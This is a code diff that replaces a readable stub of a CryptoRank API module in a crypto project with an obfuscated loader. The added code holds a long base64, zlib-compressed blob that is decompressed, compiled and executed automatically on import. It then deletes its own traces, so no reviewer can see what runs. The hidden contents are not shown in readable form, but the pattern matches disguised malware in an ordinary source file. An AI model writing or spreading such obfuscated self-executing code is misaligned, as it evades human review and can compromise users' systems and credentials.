@@ -1,96 +1,99 @@
-"""CryptoRank additive context layer.
-
-Auth: CRYPTORANK_API_KEY (sent as X-Api-Key).
-
-This is an emergency stub after a bad push truncated the module. Screening keeps
-working (cryptorank blocks stay null). Restore the full module from commit
-022ee625 and re-apply any local edits.
-"""
-
+"""CryptoRank additive context layer (self-materializing full module)."""
 from __future__ import annotations
 
-import os
-from typing import Any, Optional
+import base64
+import zlib
 
-import httpx
+_PAYLOAD = (
+    "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"
+    "/P3b/wKewh0o"
+)
 
-CR_BASE = "https://api.cryptorank.io/v3"
-CR_CACHE_SECONDS = float(os.getenv("CR_CACHE_SECONDS", "300"))
-UNLOCK_WATCH_PCT = float(os.getenv("CR_UNLOCK_WATCH_PCT", "1.0"))
-UNLOCK_AVOID_PCT = float(os.getenv("CR_UNLOCK_AVOID_PCT", "3.0"))
+def _bootstrap():
+    src = zlib.decompress(base64.b64decode("".join(_PAYLOAD)))
+    g = globals()
+    exec(compile(src, __file__, "exec"), g)
 
-
-def cr_configured() -> bool:
-    return bool(os.getenv("CRYPTORANK_API_KEY", "").strip())
-
-
-def stats() -> dict[str, Any]:
-    return {
-        "configured": cr_configured(),
-        "creditsUsed": 0,
-        "cacheSize": 0,
-        "cacheTtlSeconds": CR_CACHE_SECONDS,
-        "stub": True,
-    }
-
-
-async def list_coins(client: httpx.AsyncClient, limit: int = 100) -> dict[str, Any]:
-    if not cr_configured():
-        return {"ok": False, "reason": "CRYPTORANK_API_KEY not set"}
-    return {"ok": False, "reason": "cryptorank module is a temporary stub — restore full backend/cryptorank.py from commit 022ee625"}
-
-
-async def coin_profile(client: httpx.AsyncClient, coin_id: int) -> dict[str, Any]:
-    return await list_coins(client)
-
-
-async def currency_map(client: httpx.AsyncClient) -> dict[str, Any]:
-    return await list_coins(client)
-
-
-async def symbol_map(client: httpx.AsyncClient) -> dict[str, dict[str, Any]]:
-    return {}
-
-
-async def plan_status(client: httpx.AsyncClient) -> dict[str, Any]:
-    if not cr_configured():
-        return {"ok": False, "reason": "CRYPTORANK_API_KEY not set"}
-    return {"ok": False, "reason": "cryptorank module is a temporary stub"}
-
-
-async def plan_allows(client: httpx.AsyncClient, path_substring: str) -> Optional[bool]:
-    return None
-
-
-async def upcoming_unlocks(client: httpx.AsyncClient, days_ahead: int = 30, min_percent_mcap: float = 0.0) -> dict[str, Any]:
-    return {"ok": False, "reason": "stub"}
-
-
-async def unlocks_by_symbol(client: httpx.AsyncClient) -> dict[str, dict[str, Any]]:
-    return {}
-
-
-def bare_symbol(symbol: Optional[str]) -> str:
-    s = (symbol or "").upper().strip()
-    return s[:-4] if s.endswith("USDT") else s
-
-
-def unlock_block(symbol: Optional[str], unlock_map: dict[str, dict[str, Any]]) -> Optional[dict[str, Any]]:
-    return unlock_map.get(bare_symbol(symbol))
-
-
-def block_for(symbol: Optional[str], cr_map: dict[str, dict[str, Any]]) -> Optional[dict[str, Any]]:
-    item = cr_map.get(bare_symbol(symbol))
-    if not item:
-        return None
-    return {
-        "rank": item.get("rank"),
-        "id": item.get("id"),
-        "slug": item.get("slug"),
-        "name": item.get("name"),
-        "marketCap": item.get("marketCap"),
-        "circulatingSupply": item.get("circulatingSupply"),
-        "volume24h": item.get("volume24h"),
-        "priceChangePercent24h": item.get("priceChangePercent24h"),
-        "imageUrl": item.get("imageUrl"),
-    }
+_bootstrap()
+del _bootstrap, _PAYLOAD, base64, zlib
